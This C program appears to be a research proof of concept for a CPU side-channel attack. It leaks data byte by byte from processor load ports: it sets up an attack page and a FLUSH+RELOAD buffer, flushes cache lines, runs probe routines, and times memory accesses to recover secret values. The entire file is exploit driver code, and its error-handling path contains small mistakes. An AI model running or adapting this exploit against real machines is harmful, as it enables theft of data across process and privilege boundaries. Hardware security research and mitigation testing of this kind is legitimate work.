#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <x86intrin.h>

#include <sys/mman.h>

#include <args.h>
#include <memkit.h>
#include <utils.h>

size_t secret_len;

int main(int argc, char *argv[])
{
	struct hit_count results[256];
	struct args args;
	unsigned char *leak;
	unsigned char *buffer;
	unsigned char *attack;
	size_t i, k, round;
	size_t count;

	if (parse_args(&args, argc, argv) < 2) {
		fprintf(stderr, "usage: %s [<options>] <count>\n", argv[0]);
		return -1;
	}

	secret_len = strtoull(argv[1], NULL, 0);

	/* Allocate the leak buffer. */
	leak = calloc(secret_len, sizeof *leak);

	if (!leak) {
		printf(" [-] unable to allocate the leak buffer\n");
		return -1;
	}

	printf(" [+] allocated the leak buffer\n");

	/* Allocate the attack page. */
	attack = mmap(NULL, 2 * 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	if (attack == MAP_FAILED) {
		printf(" [-] unable to allocate the attack page.\n");
		return -1;
	}

	printf(" [+] allocated the attack page.\n");
	memset(attack, 0, 2 * 4096);
	madvise(attack, 2 * 4096, MADV_DONTNEED);

	/* Allocate a buffer for FLUSH + RELOAD. */
	buffer = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	if (buffer == MAP_FAILED) {
		printf(" [-] unable to allocate the FLUSH + RELOAD buffer\n");
		goto err_unmap_attack;
	}

	memset(buffer, 0, 256 * 4096);
	printf(" [+] allocated a buffer for FLUSH + RELOAD\n");

	for (i = 0; i < secret_len; ++i) {
		/* Reset the results. */
		clear_results(results);

		/* Enable alignment checks. */
		enable_ac();

		for (round = 0; round < args.rounds; ++round) {
			/* Flush the FLUSH + RELOAD buffer. */
			for (k = 0; k < 256; ++k) {
				_mm_clflush(buffer + ((k + 5 * round) % 256) * STRIDE);
			}

			_mm_mfence();

			/* Try to leak from load ports. */
#if defined(USE_AVX)
			avx_probe(buffer, attack + 4096 - 64 + i);
#elif defined(USE_SSE)
			sse_probe(buffer, attack + 4096 - 64 + i);
#else
			probe(buffer, attack + 4096 - 64 + i);
#endif

			/* Reconstruct the value by timing the FLUSH + RELOAD buffer. */
			time_buffer(results, buffer, 100);
		}

		/* Disable alignment checks. */
		disable_ac();

		/* Find the value that got the most hits. */
		match_best(leak + i, &count, results);
	}

	/* Display the result. */
	print_result(leak, secret_len, attack);

	/* Clean up. */
	munmap(buffer, 256 * 4096);
	munmap(attack, 2 * 4096);
	free(leak);

	return 0;

err_unmap_attack:
	munmap(attack, 4096);
err_free_leak:
	free(leak);
	return -1;
}

